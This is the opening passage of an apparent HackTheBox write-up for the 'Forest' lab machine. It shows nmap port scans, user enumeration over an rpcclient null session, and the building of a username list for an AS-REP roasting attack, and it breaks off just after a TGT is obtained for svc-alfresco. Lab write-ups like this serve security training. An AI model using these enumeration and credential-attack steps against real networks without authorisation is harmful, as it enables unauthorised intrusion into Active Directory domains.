<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-writeups docs-version-current docs-doc-page docs-doc-id-HackTheBox/forest" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">Forest | xffsec</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://xffsec.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://xffsec.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://xffsec.github.io/writeups/HackTheBox/forest"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Forest | xffsec"><meta data-rh="true" name="description" content="Enumeration"><meta data-rh="true" property="og:description" content="Enumeration"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://xffsec.github.io/writeups/HackTheBox/forest"><link data-rh="true" rel="alternate" href="https://xffsec.github.io/writeups/HackTheBox/forest" hreflang="en"><link data-rh="true" rel="alternate" href="https://xffsec.github.io/writeups/HackTheBox/forest" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"📦 Hackthebox","item":"https://xffsec.github.io/writeups/category/-hackthebox-4"},{"@type":"ListItem","position":2,"name":"Forest","item":"https://xffsec.github.io/writeups/HackTheBox/forest"}]}</script><link rel="alternate" type="application/rss+xml" href="/research/rss.xml" title="xffsec RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/research/atom.xml" title="xffsec Atom Feed"><link rel="stylesheet" href="/assets/css/styles.79a61393.css">
<script src="/assets/js/runtime~main.ab8dc2c6.js" defer="defer"></script>
<script src="/assets/js/main.14d53dc0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"dark"),document.documentElement.setAttribute("data-theme-choice",t||"dark")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><b class="navbar__title text--truncate">XFF</b></a><a class="navbar__item navbar__link" href="/writeups">📚 Writeups</a><a class="navbar__item navbar__link" href="/tutorials">🗺️ Tutorials</a><a class="navbar__item navbar__link" href="/defensive-security">🛡️ Defensive Security</a><a class="navbar__item navbar__link" href="/offensive-security">⚔️ Offensive Security</a><a class="navbar__item navbar__link" href="/research">🤖 R&amp;D</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/xffsec" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups"><span title="📚 Writeups" class="linkLabel_WmDU">📚 Writeups</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/writeups/category/-dockerlabs-4"><span title="🐋 Dockerlabs" class="categoryLinkLabel_W154">🐋 Dockerlabs</span></a><button aria-label="Expand sidebar category &#x27;🐋 Dockerlabs&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/writeups/category/-hackthebox-4"><span title="📦 Hackthebox" class="categoryLinkLabel_W154">📦 Hackthebox</span></a><button aria-label="Collapse sidebar category &#x27;📦 Hackthebox&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/bastard"><span title="Bastard" class="linkLabel_WmDU">Bastard</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/blue"><span title="Blue" class="linkLabel_WmDU">Blue</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/buff"><span title="Buff" class="linkLabel_WmDU">Buff</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/charon"><span title="Charon" class="linkLabel_WmDU">Charon</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/forest"><span title="Forest" class="linkLabel_WmDU">Forest</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/hospital"><span title="Hospital" class="linkLabel_WmDU">Hospital</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/HackTheBox/reddish"><span title="Reddish" class="linkLabel_WmDU">Reddish</span></a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/writeups/category/-hackthebox-4"><span>📦 Hackthebox</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Forest</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Forest</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration" translate="no">​</a></h2>
<p>start with a syn-scan nmap scan against the target machine, I&#x27;ll export the output to a file named allPorts and then i will perform an exhaustive scan against the specific ports</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn 10.10.10.161 -oG allPorts  -vvv</span><br></span></code></pre></div></div>
<p>i extract the ports from the file and perform a version and script scan against these specific ports</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49980 --min-rate=5000 -n -Pn 10.10.10.161 -oN targeted</span><br></span></code></pre></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE SERVICE      VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">53/tcp    open  domain       Simple DNS Plus</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-15 17:31:49Z)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp   open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">464/tcp   open  kpasswd5?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636/tcp   open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3269/tcp  open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">9389/tcp  open  mc-nmf       .NET Message Framing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49664/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49665/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49666/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49667/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49671/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49677/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49684/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49706/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">49980/tcp open  msrpc        Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb-security-mode: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   account_used: &lt;blank&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   authentication_level: user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   challenge_response: supported</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  message_signing: required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-time: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   date: 2024-09-15T17:32:40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  start_date: 2024-09-15T17:16:51</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb2-security-mode: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   3:1:1: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    Message signing enabled and required</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clock-skew: mean: 2h26m41s, deviation: 4h02m31s, median: 6m40s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb-os-discovery: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Computer name: FOREST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NetBIOS computer name: FOREST\x00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Domain name: htb.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Forest name: htb.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   FQDN: FOREST.htb.local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  System time: 2024-09-15T10:32:42-07:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 71.10 seconds</span><br></span></code></pre></div></div>
<p>there&#x27;s a htb.local domain so I&#x27;ll add it to the /etc/hosts</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">echo &quot;10.10.10.161 htb.local&quot; | sudo tee -a /etc/hosts</span><br></span></code></pre></div></div>
<p>making use of a null session with rpcclient I can enumerate the users of the machine</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rpcclient 10.10.10.161 -U &quot;&quot; -N -c &quot;enumdomusers&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[Administrator] rid:[0x1f4]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[Guest] rid:[0x1f5]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[krbtgt] rid:[0x1f6]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[DefaultAccount] rid:[0x1f7]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[$331000-VK4ADACQNUCA] rid:[0x463]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_681f53d4942840e18] rid:[0x467]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailbox670628e] rid:[0x471]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailbox968e74d] rid:[0x472]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailbox6ded678] rid:[0x473]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailbox83d6781] rid:[0x474]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailboxfd87238] rid:[0x475]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailboxb01ac64] rid:[0x476]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailbox7108a4e] rid:[0x477]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[HealthMailbox0659cc1] rid:[0x478]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[sebastien] rid:[0x479]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[lucinda] rid:[0x47a]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[svc-alfresco] rid:[0x47b]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[andy] rid:[0x47e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[mark] rid:[0x47f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[santi] rid:[0x480]</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="shell-as-svc-alfresco">shell as svc-alfresco<a href="#shell-as-svc-alfresco" class="hash-link" aria-label="Direct link to shell as svc-alfresco" title="Direct link to shell as svc-alfresco" translate="no">​</a></h2>
<p>with a list of valid users of the target machine which is an active directory an attack that can be performed is an <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast" target="_blank" rel="noopener noreferrer">ASPREPRoast attack</a>, to do this I save the filtered output of the rpcclient command to save only the user string to a dictionary named users.</p>
<blockquote>
<p>ASREPRoast is a security attack that exploits users who lack the <strong>Kerberos pre-authentication required attribute</strong>
-hacktricks</p>
</blockquote>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rpcclient 10.10.10.161 -U &quot;&quot; -N -c &quot;enumdomusers&quot; | cut -d &quot;:&quot; -f2|cut -d&quot; &quot; -f1| tr -d &quot;[]&quot;  &gt; users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Guest</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">krbtgt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DefaultAccount</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$331000-VK4ADACQNUCA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_2c8eef0a09b545acb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_ca8c2ed5bdab4dc9b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_75a538d3025e4db9a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_681f53d4942840e18</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_1b41c9286325456bb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_9b69f1b9d2cc45549</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_7c96b981967141ebb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_c75ee099d0a64c91b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SM_1ffab36a2f5f479cb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailboxc3d7722</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailboxfc9daad</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailboxc0a90c9</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailbox670628e</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailbox968e74d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailbox6ded678</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailbox83d6781</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailboxfd87238</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailboxb01ac64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailbox7108a4e</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HealthMailbox0659cc1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sebastien</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lucinda</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">svc-alfresco</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">andy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mark</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">santi</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="aspreproast">aspreproast<a href="#aspreproast" class="hash-link" aria-label="Direct link to aspreproast" title="Direct link to aspreproast" translate="no">​</a></h3>
<p>running GetNPUsers.py I am able to obtain the TGT of the user svc-alfresco</p>
